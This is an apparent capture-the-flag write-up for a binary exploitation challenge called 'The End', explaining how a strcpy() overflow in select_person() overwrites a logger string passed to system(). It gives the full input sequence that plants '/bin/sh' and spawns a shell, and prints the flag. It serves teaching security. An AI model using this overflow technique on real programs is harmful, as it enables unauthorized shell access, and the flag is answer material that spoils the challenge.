## The End

[end](https://github.com/Rookie441/CTF/blob/main/Categories/Binary%20Exploitation/Medium/the-end/end)  
[end.c](https://github.com/Rookie441/CTF/blob/main/Categories/Binary%20Exploitation/Medium/the-end/end.c)

> Let's analyze the main() function

```C
int main() {
    setup();

    show_menu();

    app.list = (struct Person *) malloc(sizeof(struct Person) * 20);

    strcpy(app.stats.logger, "echo \"-- total: %d, average BMI: %.2f --\" >> log.txt"); //vulnerable
    app.stats.total_bmi = 0;
    app.stats.total_count = 0;

    while(1) {
        printf("\nChoose action: ");
        int op = read_int();

        if (op == 1) {
            add_person();
        } else if (op == 2) {
            delete_person();
        } else if (op == 3) {
            select_person();
            calculate_bmi();
        } else if (op == 4) {
            break;
        } else {
            printf("What?\n");
        }
    }

    char command[COMMAND_MAX_LENGTH];
    snprintf(command, COMMAND_MAX_LENGTH, app.stats.logger,
             app.stats.total_count, app.stats.total_bmi / app.stats.total_count);

    system(command);

    exit(0);
}
```

> The line `system(command);` is key because if we could make command to be `/bin/sh`, we can spawn a shell. Hence our aim is to overflow and write into `app.stats.logger` since it is being copied into the command variable during `snprintf()`.

```C
struct Info {
    char  logger[COMMAND_MAX_LENGTH];
    int   total_count;
    float total_bmi;
};

struct Person {
    char name[NAME_MAX_LENGTH];
    int  age;
    int  gender;
    int  height;
    int  weight;
};

struct App {
    struct Person *list;
    struct Person selected;
    struct Info   stats;
} app;
```
> From examining the structs stored in memory, we can note that the logger is stored in the struct `Info`. In the struct `App`, we can see that the Person list and Person selected comes before Info, which contains our logger.

```C
void select_person() {
    printf("Index (0-19): ");
    int index = read_int();
    if (index < 0 || index > 19) {
        printf("Aha! Doing something bad huh?");
        return;
    }

    struct Person *p = &app.list[index];

    strcpy(app.selected.name, p->name);
    app.selected.age = p->age;
    app.selected.gender = p->gender;
    app.selected.height = p->height;
    app.selected.weight = p->weight;
}
```

> We can explore further to note that `select_person()` copies the name of the person into `app.selected.name` using the unsafe `strcpy()`. Hence if we overflow the length that is copied by enough characters, it would write into the logger, and if we write `/bin/sh` into the logger it would be put into the system() and open up a shell.

> When the name of a person is not null terminated, then select_person() would copy the name, and everything after that into the `selected.name` until it reaches a null character. Hence we have to ensure that the age, gender, height, weight does not convert into null character when split into 4 (Since they are ints), by storing -1 into all of them (so they convert to 4 `\xFF` characters)

> Also, when the name of the person is the same length as the struct of the person, it is still not long enough (only able to overwrite till the end of the selected person struct).
Thus, we should store another person directly after the first person. Then when we copy the first person name it would copy all the way through the second person name until it reaches a null character (which we can set using 0).

> The following inputs first stores 16 characters into the first person name (as that is the max length of the name) and -1 into all the other fields. Then it stores /bin/sh into the second person name. Then we choose option 3 to select the first person, and then option 3 again to select the second person and finally press 4 to break out of the while loop and run the command in the logger.

```
1
0
AAAAAAAAAAAAAAAA
-1
-1
-1
-1

1
1
/bin/sh
0
0
0
0

3
0

3
1

4
```

![image](https://github.com/Rookie441/CTF/blob/main/Categories/Binary%20Exploitation/Medium/the-end/Solved.png)  

`CS2107{tH3_End_7o_ThE_3ND_1s_Th3_Be91nNInG}`
